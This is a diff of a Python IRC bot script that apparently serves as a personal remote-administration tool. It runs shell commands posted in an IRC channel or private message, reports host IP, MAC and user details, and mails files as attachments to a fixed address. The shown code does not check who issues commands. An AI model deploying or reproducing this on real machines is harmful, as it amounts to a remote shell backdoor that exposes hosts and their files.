@@ -13,7 +13,7 @@ from subprocess import Popen, PIPE, STDOUT
 import time
 from time import strftime, sleep
 
-version = 0.7
+version = 1.0
 
 def log(prefix, content=''):
    try:
@@ -41,9 +41,9 @@ helpmsg = 'Version: v%s\n\
 Available Commands: \n\
  1. !quit          #-- shutdown the bot \n\
  2. !reload        #-- reconnect to IRC \n\
- 3. identify       #-- provide info on host system\n\
+ 3. !identify       #-- provide info on host system\n\
  4. email$         #-- send email to admin with attch listed after $\n\
- 5. help           #-- display this message\n\
+ 5. !help           #-- display this message\n\
  6. $<command>     #-- run <command> in shell and capture live output\n\
  7. !cancel        #-- stop grabbing running command output\n' % version
 
@@ -96,26 +96,16 @@ def privmsg(msg=None, to=admin):                                  # function to 
 def broadcast(msg):                                               # function to send a message to the main channel
    privmsg(msg, channel)
 
-def run(cmd, respond_method='priv'):
-   def respond(content):
-      if (respond_method == 'pub'):
-         broadcast(content)
-      else:
-         privmsg(content)
-
+def do(cmd, timeout=600, verbose=False):
    out = ''
-   cmd = cmd.strip()
-   respond('[$] %s' % cmd)
-   log("[+] Ran Command:")
-   log("[$]   CMD: ", [cmd])
    signal.signal(signal.SIGALRM, handler)
-   signal.alarm(5)
+   signal.alarm(timeout)
    try:
       p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
       log("[$]   Started.")
       run = 1
    except Exception as e:
-      respond("Failed: %s" % e)
+      yield("Failed: %s" % e)
       out += "Failed: %s" % e
       run = 0
    signal.alarm(0)
@@ -127,7 +117,8 @@ def run(cmd, respond_method='priv'):
          signal.alarm(2)
          try:
             line = p.stdout.readline()
-            respond(line)
+            if verbose: yield(line)
+            else: yield(line.strip())
             out += line
          except:
             log('[#] Checking for input.')
@@ -137,7 +128,7 @@ def run(cmd, respond_method='priv'):
          if (data.find('!cancel') != -1):
             run = 0
             retcode = "Cancelled."
-            respond("[X]: %s" % retcode)
+            yield("[X]: %s" % retcode)
             os.killpg(p.pid, signal.SIGTERM)
             break
          else:
@@ -148,24 +139,36 @@ def run(cmd, respond_method='priv'):
       signal.alarm(0)
       if (retcode is not None):
          line = p.stdout.read()
-         respond(line)
+         if verbose: yield(line)
          out += line
          out += "[$] Exit Status: %s" % retcode
          if (retcode != 0):
-            respond("[X]: %s" % retcode)
-         else:
-            respond("[√]")
+            yield("[X]: %s" % retcode)
+         elif (retcode == 0) and verbose:
+            yield("[√]")
          run = 0
          break
-   log('[#] Done.')
-      
 
+def run(cmd, public=False):
+   def respond(content):
+      if public:
+         broadcast(content)
+      else:
+         privmsg(content)
+
+   out = ''
+   cmd = cmd.strip()
+   respond('[$] %s' % cmd)
+   log("[+] Ran Command:")
+   log("[$]   CMD: ", [cmd])
+   for line in do(cmd, verbose=True):
+      respond(line)
+   log('[#] Done.')
    split = line_split(out, 480)
    ttl = len(split)
    for idx, line in enumerate(split):
       log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
       log("\n")
-
 
 def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Test",attch=[]): # do not use attch.append() http://stackoverflow.com/a/113198/2156113
    err = """\n
@@ -179,7 +182,7 @@ def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Test",attch=
             cmd = 'uuencode %s %s | mailx -s "%s" %s' % (attachment.strip(), attachment.strip(), subj, to)
             log('[+] Sending email...')
             log('[<]    ',cmd)
-            sts = run(cmd, "pub")
+            sts = run(cmd, public=False)
             return "Sending email to %s. (subject: %s, attachments: %s\n[X]: %s)" % (to, subj, str(attch), str(sts))
          except Exception as error:
             return str(error)
@@ -206,7 +209,7 @@ def identify():
    s.close()
    log('[>]    Local:   ',local_ip)
    import urllib2
-   public_ip = urllib2.urlopen('http://ifconfig.me/ip').read()
+   public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    log('[>]    Public:  ',public_ip)
    import uuid
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
@@ -229,7 +232,7 @@ def priv_identify():
    privmsg('[>]      Local:   %s' % local_ip)
 
    import urllib2
-   public_ip = urllib2.urlopen('http://ifconfig.me/ip').read()
+   public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    log('[>]    Public:  ',public_ip)
    privmsg('[>]      Public:  %s' % public_ip)
 
@@ -239,25 +242,19 @@ def priv_identify():
    privmsg('[>]      MAC:     %s' % mac_addr)
 
    cmd = "system_profiler SPPowerDataType | grep Connected"
-   log('[>]    CMD:     ',cmd)
-   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
-   power = p.stdout.read()
-   log('[>]    Power:    ',power.strip())
-   privmsg('[>]      Power:    %s' % power.strip())
+   for line in do(cmd):
+      log('[>]    Power:    ',line)
+      privmsg('[>]      Power:    %s' % line)
 
    cmd = "uptime"
-   log('[>]    CMD:     ',cmd)
-   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
-   uptime = p.stdout.read()
-   log('[>]    UP:    ',uptime.strip())
-   privmsg('[>]      Up:    %s' % uptime.strip())
+   for line in do(cmd):
+      log('[>]    UP:    ',line)
+      privmsg('[>]      Up:    %s' % line)
 
    cmd = "cd /Users/; du -s * 2>/dev/null | sort -nr | head -1 | awk  '{print $2}'"
-   log('[>]    CMD:     ',cmd)
-   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
-   main_user = p.stdout.read()
-   log('[>]    User:    ',main_user.strip())
-   privmsg('[>]      User:    %s' % main_user.strip())
+   for line in do(cmd):
+      log('[>]    User:    ',line)
+      privmsg('[>]      User:    %s' % line)
 
    cmd = "system_profiler SPHardwareDataType"
    log('[>]    CMD:     ',cmd)
@@ -270,96 +267,97 @@ def priv_identify():
 
 
 ############The beef of things
-if len(nick) > 15: nick = '[%s]' % (local_user[:13])
-last_ping = time.time()
-threshold = 5 * 60
-quit_status = False
-while not quit_status:
-   timeout_count = 0
-   last_data = data = ''
-   log("[+] Connecting...")
-   log("[<]    Nick:        ", nick)
-   log("[<]    Server:      ", server+':'+str(port))
-   log("[<]    Room:        ", channel)
-   try:
-      irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      irc.settimeout(60)
-      irc.connect((server, port))
-      recv = irc.recv ( 4096 )
-      log("[+] Recieved:    ", recv+'\n')
-      irc.send ('NICK %s\r\n' % nick )
-      irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
-      irc.send ('JOIN %s\r\n' % channel)
-      broadcast('Bot v%s Running.' % version)
-   except Exception as error:
-      log('[*] Connection Failed: ')
-      log('[X]    ',error)
-      timeout_count = 50
-      sleep(10)
-
-   while not quit_status and (timeout_count < 50):
-      if (last_data == data):
-         timeout_count += 1
+if __name__ == '__main__':
+   if len(nick) > 15: nick = '[%s]' % (local_user[:13])
+   last_ping = time.time()
+   threshold = 5 * 60
+   quit_status = False
+   while not quit_status:
+      timeout_count = 0
+      last_data = data = ''
+      log("[+] Connecting...")
+      log("[<]    Nick:        ", nick)
+      log("[<]    Server:      ", server+':'+str(port))
+      log("[<]    Room:        ", channel)
       try:
-         data = irc.recv ( 4096 )
-         log('[+] Recieved:')
-         log('[>]    ', data)
-      except socket.timeout:
-         if (time.time() - last_ping) > threshold:
-            log('[*] Disconnected.')
-            timedout_count = 50
-            break
-         else:
-            data = str(time.time())
-            pass
-
-      if data.find ('PING') != -1:                                     # im warning you, dont touch this bit
-         irc.send ('PONG ' + data.split()[1] + '\r')
-         last_ping = time.time()
-         log('[+] Sent Data:')
-         log('[<]    PONG ',data.split()[1])
-         timeout_count = 0    
-
-      elif data.find('ickname is already in use') != -1:
-         nick += str(random.randint(1,200))
-         if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
+         irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         irc.settimeout(60)
+         irc.connect((server, port))
+         recv = irc.recv ( 4096 )
+         log("[+] Recieved:    ", recv+'\n')
+         irc.send ('NICK %s\r\n' % nick )
+         irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
+         irc.send ('JOIN %s\r\n' % channel)
+         broadcast('Bot v%s Running.' % version)
+      except Exception as error:
+         log('[*] Connection Failed: ')
+         log('[X]    ',error)
          timeout_count = 50
+         sleep(10)
 
-      elif scan('!quit') or privscan('quit'):
-         privmsg('Quitting.')
-         irc.send ( 'QUIT\r\n' )
-         quit_status = True
+      while not quit_status and (timeout_count < 50):
+         if (last_data == data):
+            timeout_count += 1
+         try:
+            data = irc.recv ( 4096 )
+            log('[+] Recieved:')
+            log('[>]    ', data)
+         except socket.timeout:
+            if (time.time() - last_ping) > threshold:
+               log('[*] Disconnected.')
+               timedout_count = 50
+               break
+            else:
+               data = str(time.time())
+               pass
 
-      elif scan('!reload') or privscan('reload'):
-         privmsg('Reloading.')
-         irc.send ( 'QUIT\r\n' )
-         break
+         if data.find ('PING') != -1:                                     # im warning you, dont touch this bit
+            irc.send ('PONG ' + data.split()[1] + '\r')
+            last_ping = time.time()
+            log('[+] Sent Data:')
+            log('[<]    PONG ',data.split()[1])
+            timeout_count = 0    
 
-      elif scan('!identify'):
-         broadcast(identify())
+         elif data.find('ickname is already in use') != -1:
+            nick += str(random.randint(1,200))
+            if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
+            timeout_count = 50
 
-      elif privscan('identify'):
-         priv_identify()
+         elif scan('!quit') or privscan('quit'):
+            privmsg('Quitting.')
+            irc.send ( 'QUIT\r\n' )
+            quit_status = True
 
-      elif privscan('help'):
-         privmsg(helpmsg)
+         elif scan('!reload') or privscan('reload'):
+            privmsg('Reloading.')
+            irc.send ( 'QUIT\r\n' )
+            break
 
-      elif scan('help'):
-         broadcast(helpmsg)
+         elif scan('!identify'):
+            broadcast(identify())
 
-      elif scan('email$'):
-         attch = data.split("$")[1].split(',')
-         to = "nikisweeting+bot@gmail.com"
-         broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
+         elif privscan('identify'):
+            priv_identify()
 
-      elif scan('$'):
-         cmd = data.split("$")[1]
-         run(cmd, 'pub')
+         elif privscan('help'):
+            privmsg(helpmsg)
 
-      elif privscan('$'):
-         cmd = data.split("$")[1]
-         run(cmd, 'priv')
+         elif scan('help'):
+            broadcast(helpmsg)
 
-      last_data = data
+         elif scan('email$'):
+            attch = data.split("$")[1].split(',')
+            to = "nikisweeting+bot@gmail.com"
+            broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))
 
-log("[*] EXIT")
+         elif scan('$'):
+            cmd = data.split("$")[1]
+            run(cmd, public=True)
+
+         elif privscan('$'):
+            cmd = data.split("$")[1]
+            run(cmd, public=False)
+
+         last_data = data
+
+   log("[*] EXIT")
